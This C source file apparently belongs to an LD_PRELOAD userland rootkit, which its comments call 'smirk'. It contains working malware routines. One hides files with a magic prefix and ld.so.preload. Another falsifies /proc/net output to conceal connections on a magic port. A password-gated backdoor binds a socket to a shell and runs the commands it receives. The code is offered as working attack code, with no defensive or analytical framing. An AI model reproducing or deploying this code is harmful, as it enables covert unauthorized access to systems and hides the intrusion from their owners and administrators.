#include "utils.h"

/*
 * Function:  matches_reg 
 * --------------------
 * matches regular expression
 *
 *  reg: regular expression
 *  str: string to be matched
 *
 *  returns: 1 if matches otherwise 0  
 */
int matches_reg(const char *reg, const char *str){
    regex_t regex;
    int reti = regcomp(&regex, reg, REG_EXTENDED);
    if (reti){
        return 0;
    }
    reti = regexec(&regex, str, 0 , NULL, 0);
    if (!reti){
        return 1;
    }
    return 0;
}

/*
 * Function:  is_magicfile
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_magicfile(const char *filename){
    char *file = basename(filename);
    char magic_re[256] = "(^ld\\.so\\.preload$|";
    strcat(magic_re, MAGIC_PREFIX);
    strcat(magic_re,")");
    return matches_reg(magic_re, file);
}

/*
 * Function:  is_net_file
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_net_file(const char *pathname){
    return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
}

/*
 * Function:  fake_netstat
 * --------------------
 * creates a fakenetstat file given the original and purging it from MAGIC_PORT
 *
 *  pathname: full the path name
 *  newfile: file pointer to new filename string that will be filled
 *
 *  returns: 1 if works otherwise 0  
 */
int fake_netstat(char *pathname, char *newfile){
    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }
    FILE *real_fp = hooked_fopen(pathname, "r");
    if (!real_fp){
        return 0;
    }
    strcpy(newfile,FAKE_NETSTAT_FILE);
    char *proto = basename(pathname);
    strcat(newfile,proto);
    FILE *fake_fp = hooked_fopen(newfile,"w");
    char hex_port[7]; 
    sprintf(hex_port, ":%04X ", MAGIC_PORT);

    char str[256];
    while (fgets(str, 256, real_fp)){
        if (strstr(str, hex_port) == NULL){
            fputs(str, fake_fp);
        }
    }
    fclose(fake_fp);
    return 1;
}

/*
 * Function:  uninstal
 * --------------------
 * unistall smirk from system
 *
 *  returns: nothing 
 */
void uninstall(){
    unlink(MAGIC_LIBPATH);
}

/*
 * Function:  read_line
 * --------------------
 * given the socket fd the function store in buffer the string of max size bytes
 *
 *  fd: the file descriptor
 *  buffer: pointer to the buffer to store the string
 *  max_size: max size of the buffer
 *
 *  returns: nothing
 */
void read_line(int fd, char *buffer, int max_size){
    int l = 0;
    int c = 'X';
    while (c && c != '\n' && l < max_size){
        read(fd, &c, 1);
        buffer[l] = c;
        l++;
    }
    buffer[l-1] = '\0';
}

/*
 * Function:  backdoor
 * --------------------
 * given the socket it spawn a shell with a password request
 *
 *  args: the pointer to the socket
 *
 *  returns: nothing
 */
void *backdoor(void *args){
    int fd = *((int *) args);
    // get password
    write(fd, "PASS>", 5);
    char buff[1024];
    read_line(fd, buff, sizeof(buff));
    if (strcmp(buff, PASSWORD) != 0){
        char lovephrase[] = "Fuck off.\n";
        write(fd, lovephrase, sizeof(lovephrase));
        close(fd);
        return NULL;
    }

    // manage shell
    write(fd,"CMD>",4);
    read_line(fd, buff, sizeof(buff));
    dup2(fd, 0); //stdin
    dup2(fd, 1); //stdout
    dup2(fd, 2); //stderr

    system(buff);
    close(fd);
}
